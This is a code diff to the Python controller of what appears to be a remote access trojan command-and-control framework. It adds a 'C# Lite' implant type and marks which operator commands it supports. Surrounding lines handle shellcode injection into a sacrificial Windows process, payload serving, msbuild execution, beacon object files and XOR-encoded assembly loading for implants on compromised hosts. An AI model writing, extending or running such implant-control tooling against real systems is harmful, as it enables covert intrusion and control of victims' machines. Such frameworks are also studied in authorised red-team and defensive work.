@@ -60,7 +60,7 @@ msbuild_path = default_msbuild_path
 default_shellcode_process = "C:\\Windows\\System32\\SearchProtocolHost.exe" # Default sacrificial process for creating a new process then injecting shellcode
 shellcode_process = default_shellcode_process
 
-supported_types = ["nim", "c#", "js", "ps1", "hta"]
+supported_types = ["nim", "c#", "js", "ps1", "hta", "c#l"]
 alpha = string.ascii_lowercase # Grab the alphabet in lowercase format 
 
 # Generate a random path to serve payloads off of
@@ -266,10 +266,11 @@ def colors(value):
     UNDERLINE = '\001\033[4m\002'
     nim = '\001\033[91m\002'  # Red
     cs = '\001\033[92m\002'   # Green
+    csl = '\001\033[33;2m\002'  # dim-green # C# Lite
     js = '\001\033[93m\002'   # Yellow
     ps1 = '\001\033[94m\002'  # Blue
     hta = '\001\033[95m\002'  # Purple
-    colors = {"nim":nim, "c#":cs, "js":js, "ps1":ps1, "hta":hta}
+    colors = {"nim":nim, "c#":cs, "c#l":csl, "js":js, "ps1":ps1, "hta":hta}
     if(value in colors.keys()):
         return(colors[value] + value + ENDC)
     elif(value in types.keys()):
@@ -999,6 +1000,9 @@ if __name__ == "__main__":
                                 inp = "spawn " + send_ratcode(ratID)
 
                         elif(str.startswith(inp, "exec ")):
+                            if(types[ratID] == "c#l"):
+                                pretty_print("[!] Feature is unsupported for c#-lite rats, sorry")
+                                continue
                             inp = "ex " + base64.b64encode(" ".join(inp.split(" ")[1:]).encode('utf-8')).decode('utf-8')
 
                         elif(str.startswith(inp, "psh ")):
@@ -1011,6 +1015,9 @@ if __name__ == "__main__":
                                     pass
                                 if(types[ratID] == "ps1" or types[ratID] == "c#" or types[ratID] == "nim"):
                                     inp = "psh " + create_psscript(filepath, extra_cmds)
+                                elif(types[ratID] == "c#l"):
+                                    pretty_print("[!] Feature is unsupported for c#-lite rats, sorry")
+                                    continue
                                 else:
                                     inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
                             except:
@@ -1020,7 +1027,10 @@ if __name__ == "__main__":
                         elif(str.startswith(inp, "shellcode ")):
                             try:
                                 arg1 = inp.split(" ")[1]
-                                if(types[ratID] == "ps1"):
+                                if(types[ratID] == "c#l"):
+                                    pretty_print("[!] Feature is unsupported for c#-lite rats, sorry")
+                                    continue
+                                elif(types[ratID] == "ps1"):
                                     inp = "shc " +  send_invoke_shellcode(inp, ratID)
                                 elif(types[ratID] == "c#" or types[ratID] == "nim"):
                                     if(arg1 == "local" or arg1.isdigit()):
@@ -1035,7 +1045,7 @@ if __name__ == "__main__":
                                 continue
 
                         elif(str.startswith(inp, "bof ")):
-                            if(types[ratID] != "nim" and types[ratID] != "c#"):
+                            if(types[ratID] != "nim" and types[ratID] != "c#" and types[ratID] != "c#l"):
                                 pretty_print("[!] Nim and C# are the only language capable of executing BOFS, sorry!")
                                 continue
                             if(len(inp.split(' ')) < 2 or len(inp.split(' ')) == 3):
@@ -1064,8 +1074,8 @@ if __name__ == "__main__":
                                 inp = "bof " + base64.b64encode(bofbytes).decode('utf-8')
 
                         elif(str.startswith(inp, "donut-exec ")):
-                            if(types[ratID] == "ps1"):
-                                pretty_print("[!] Feature is unsupported for PS1 rats, sorry")
+                            if(types[ratID] == "ps1" or types[ratID] == "c#l"):
+                                pretty_print("[!] Feature is unsupported for PS1 and c#-lite rats, sorry")
                                 continue
                             elif(types[ratID] == "c#" or types[ratID] == "nim"):
                                 inp = "shc " + cs_donut_exec(inp)
@@ -1075,8 +1085,8 @@ if __name__ == "__main__":
                         elif(str.startswith(inp, "eval ")):
                             try:
                                 filepath = inp.split(" ")[1]
-                                if(types[ratID] == "ps1" or types[ratID] == "c#" or types[ratID] == "nim"):
-                                    pretty_print("[!] Eval is not supported for PS1 or C# rats")
+                                if(types[ratID] == "ps1" or types[ratID] == "c#" or types[ratID] == "c#l" or types[ratID] == "nim" ):
+                                    pretty_print("[!] Eval is not supported for PS1, C#, or Nim rats")
                                     continue
                                 else:
                                     if(str.startswith(filepath, "http://") or str.startswith(filepath, "https://")): # http URL eval
@@ -1105,7 +1115,7 @@ if __name__ == "__main__":
                                 filepath = inp.split(" ")[1]
                                 if(types[ratID] == "ps1"):
                                     inp = "cs " + send_invoke_assembly(inp)
-                                elif(types[ratID] == "c#" or types[ratID] == "nim"):
+                                elif(types[ratID] == "c#" or types[ratID] == "c#l" or types[ratID] == "nim"):
                                     with open(filepath, "rb") as fd:
                                         inp = "cs " + xor_crypt_and_encode(fd.read(), ratID) + " " + parse_c_sharp_args(inp)
                                 else:
